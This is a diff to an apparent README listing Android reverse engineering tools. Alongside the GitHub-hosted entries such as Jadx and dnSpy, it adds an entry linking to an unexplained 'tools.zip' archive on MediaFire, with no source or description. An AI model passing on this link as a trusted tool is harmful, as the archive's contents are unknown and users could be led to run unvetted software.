@@ -11,6 +11,7 @@ Top Android Reverse Engineering Tools with different functions.
  - [APK Repatcher](https://github.com/csanuragjain/APKRepatcher)
  - [Jadx](https://github.com/skylot/jadx)
  - [dnSpy](https://github.com/dnSpy/dnSpy)
+ - [Android Tools](https://www.mediafire.com/file/67es4trexysy7cy/tools.zip/file)
 
 
 ## License
